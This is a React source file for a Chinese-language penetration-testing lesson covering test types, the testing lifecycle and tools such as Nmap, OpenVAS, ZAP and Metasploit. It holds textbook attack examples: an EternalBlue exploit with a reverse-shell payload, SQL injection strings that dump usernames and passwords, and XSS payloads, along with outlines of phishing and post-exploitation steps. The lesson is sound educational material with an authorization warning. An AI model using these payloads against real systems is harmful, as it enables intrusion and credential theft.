'use client'

import LessonLayout, { type LessonMeta } from '@shared/components/ui/book/LessonLayout'
import { THEMES } from '@shared/components/ui/book/theme'
import {
  PageTitle,
  SectionTitle,
  BookParagraph,
  BookCode,
  BookAlert,
  BookList,
  TagGrid,
} from '@shared/components/ui/book/BookContent'

const META: LessonMeta = {
  subject: '网络安全',
  chapterTitle: '渗透测试基础',
  chapterNumber: 1,
  totalChapters: 10,
  subjectHref: '/study/security/penetration',
  nextChapter: { label: '信息收集', href: '/study/security/penetration/recon' },
  theme: THEMES.security,
}

const SPREADS = [
  {
    label: '基础概念',
    left: (
      <div className="space-y-4">
        <PageTitle>渗透测试基础概念</PageTitle>
        <BookParagraph>渗透测试（Penetration Testing）是一种模拟黑客攻击的安全测试方法，通过模拟真实攻击者的行为，发现系统中存在的安全漏洞和风险。渗透测试的目标是帮助组织发现并修复潜在的安全问题，提高系统的整体安全性。</BookParagraph>
        <SectionTitle>渗透测试的分类</SectionTitle>
        <BookList items={[
          '黑盒测试：测试人员对目标系统一无所知，完全模拟外部攻击者的视角。优点：更接近真实攻击场景。缺点：测试效率较低。适用于外部安全评估。',
          '白盒测试：测试人员拥有目标系统的完整信息。优点：测试效率高，覆盖全面。缺点：可能忽略外部视角的问题。适用于内部安全评估。',
          '灰盒测试：测试人员拥有部分系统信息。优点：平衡效率和真实性。适用于综合安全评估。',
          '红队测试：模拟高级持续性威胁（APT）攻击。优点：测试真实防御能力。缺点：成本高，风险大。需要专业的红队团队。',
        ]} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>渗透测试生命周期</PageTitle>
        <div style={{ textAlign: 'center', margin: '16px 0' }}>
          <svg width="700" height="350" viewBox="0 0 700 350">
            <defs>
              <linearGradient id="pgrad1" x1="0%" y1="0%" x2="100%" y2="0%">
                <stop offset="0%" style={{ stopColor: '#4F46E5', stopOpacity: 1 }} />
                <stop offset="100%" style={{ stopColor: '#7C3AED', stopOpacity: 1 }} />
              </linearGradient>
              <marker id="parrow" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
                <polygon points="0 0, 10 3.5, 0 7" fill="#4F46E5" />
              </marker>
            </defs>
            <circle cx="350" cy="175" r="130" fill="none" stroke="#E5E7EB" strokeWidth="2" />
            <g transform="translate(350,175)">
              <g transform="rotate(-45)">
                <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#pgrad1)" opacity="0.9" />
                <text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">信息收集</text>
              </g>
              <g transform="rotate(45)">
                <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#pgrad1)" opacity="0.9" />
                <text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">漏洞扫描</text>
              </g>
              <g transform="rotate(135)">
                <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#pgrad1)" opacity="0.9" />
                <text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">漏洞利用</text>
              </g>
              <g transform="rotate(225)">
                <rect x="-60" y="-30" width="120" height="60" rx="10" fill="url(#pgrad1)" opacity="0.9" />
                <text x="0" y="5" textAnchor="middle" fill="white" fontSize="14" fontWeight="500">后渗透测试</text>
              </g>
            </g>
            <path d="M 350 45 L 350 305" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#parrow)" />
            <path d="M 45 175 L 655 175" stroke="#4F46E5" strokeWidth="2" markerEnd="url(#parrow)" />
            <circle cx="350" cy="175" r="10" fill="#4F46E5" />
          </svg>
        </div>
        <SectionTitle>渗透测试的基本流程</SectionTitle>
        <BookList items={[
          '前期准备：确定测试范围和目标，制定测试计划，准备测试环境，获取必要的授权',
          '信息收集：域名信息收集（WHOIS、DNS记录）、子域名枚举、端口扫描和服务识别、Web应用信息收集',
          '漏洞扫描：使用自动化工具进行扫描，手动验证发现的漏洞，漏洞分类和风险评估',
          '漏洞利用：选择合适的攻击向量，编写或使用漏洞利用代码，获取系统访问权限',
          '后渗透测试：维持访问权限，收集敏感信息，内网渗透测试，清理痕迹',
          '报告编写：漏洞详细描述，风险评估和影响分析，修复建议，测试过程记录',
        ]} />
      </div>
    ),
  },
  {
    label: '工具使用',
    left: (
      <div className="space-y-4">
        <PageTitle>信息收集与漏洞扫描工具</PageTitle>
        <SectionTitle>Nmap</SectionTitle>
        <BookParagraph>网络扫描和主机发现工具：</BookParagraph>
        <BookCode language="bash" code={`# 基本扫描
nmap 192.168.1.1

# 详细扫描
nmap -sV -sC -p- 192.168.1.1

# 操作系统检测
nmap -O 192.168.1.1

# 脚本扫描
nmap --script vuln 192.168.1.1`} />
        <SectionTitle>Whois</SectionTitle>
        <BookParagraph>域名信息查询工具：</BookParagraph>
        <BookCode language="bash" code={`# 查询域名信息
whois example.com

# 查询IP信息
whois 192.168.1.1`} />
        <SectionTitle>Nessus / OpenVAS</SectionTitle>
        <BookParagraph>Nessus是商业漏洞扫描器，支持多种漏洞检测，提供详细的漏洞报告。OpenVAS是开源漏洞扫描器：</BookParagraph>
        <BookCode language="bash" code={`# 启动OpenVAS
openvas-setup
openvas-start

# 创建扫描任务
omp -u admin -w admin --create-target --name "Target" --hosts 192.168.1.1
omp -u admin -w admin --create-task --name "Scan" --target "Target" --config "Full and fast"`} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>Web应用测试与漏洞利用工具</PageTitle>
        <SectionTitle>Burp Suite</SectionTitle>
        <BookParagraph>Web应用测试平台，支持代理拦截和修改请求、漏洞扫描、自动化测试、API测试。</BookParagraph>
        <SectionTitle>OWASP ZAP</SectionTitle>
        <BookParagraph>开源Web应用扫描器：</BookParagraph>
        <BookCode language="bash" code={`# 启动ZAP
zap.sh

# 命令行扫描
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" http://example.com`} />
        <SectionTitle>Metasploit</SectionTitle>
        <BookParagraph>渗透测试框架：</BookParagraph>
        <BookCode language="bash" code={`# 启动Metasploit
msfconsole

# 搜索漏洞利用模块
msf > search type:exploit platform:windows

# 使用漏洞利用模块
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 192.168.1.1
msf > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf > set LHOST 192.168.1.100
msf > exploit`} />
      </div>
    ),
  },
  {
    label: '测试方法',
    left: (
      <div className="space-y-4">
        <PageTitle>Web应用测试方法</PageTitle>
        <SectionTitle>SQL注入测试</SectionTitle>
        <BookCode language="text" code={`# 基本SQL注入测试
' OR '1'='1
' OR '1'='1' --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password,3 FROM users --`} />
        <SectionTitle>XSS测试</SectionTitle>
        <BookCode language="html" code={`<!-- 反射型XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
javascript:alert('XSS')

<!-- 存储型XSS -->
<svg onload=alert('XSS')>
<body onload=alert('XSS')>`} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>网络渗透与社会工程学</PageTitle>
        <SectionTitle>端口扫描与服务识别</SectionTitle>
        <BookCode language="bash" code={`# TCP SYN扫描
nmap -sS 192.168.1.1

# TCP连接扫描
nmap -sT 192.168.1.1

# UDP扫描
nmap -sU 192.168.1.1

# 版本检测
nmap -sV 192.168.1.1

# 操作系统检测
nmap -O 192.168.1.1

# 脚本扫描
nmap --script vuln 192.168.1.1`} />
        <SectionTitle>社会工程学测试</SectionTitle>
        <BookList items={[
          '钓鱼邮件测试：制作钓鱼邮件模板，设置钓鱼网站，发送测试邮件，收集用户响应',
          '电话测试：准备测试脚本，模拟紧急情况，测试信息泄露，评估安全意识',
        ]} />
      </div>
    ),
  },
  {
    label: '实践案例',
    left: (
      <div className="space-y-4">
        <PageTitle>案例1：Web应用渗透测试</PageTitle>
        <BookParagraph>目标：某电商网站</BookParagraph>
        <BookList items={[
          '信息收集：域名信息收集、子域名枚举、目录扫描',
          '漏洞扫描：使用OWASP ZAP进行扫描，手动验证发现的漏洞',
          '漏洞利用：SQL注入测试、XSS测试、CSRF测试',
          '报告编写：漏洞描述、复现步骤、修复建议',
        ]} />
      </div>
    ),
    right: (
      <div className="space-y-4">
        <PageTitle>案例2：内网渗透测试</PageTitle>
        <BookParagraph>目标：企业内部网络</BookParagraph>
        <BookList items={[
          '信息收集：网络拓扑发现、主机扫描、服务识别',
          '漏洞利用：使用Metasploit进行漏洞利用，获取初始访问权限',
          '权限提升：本地提权、域内提权',
          '横向移动：内网主机扫描、密码哈希获取、远程命令执行',
        ]} />
        <BookAlert type="info" message="渗透测试必须在获得明确授权的前提下进行。未经授权的渗透测试是违法行为。所有测试活动都应严格遵守法律法规和道德准则。" />
      </div>
    ),
  },
]

export default function PenetrationBasicPage() {
  return <LessonLayout meta={META} spreads={SPREADS} />
}
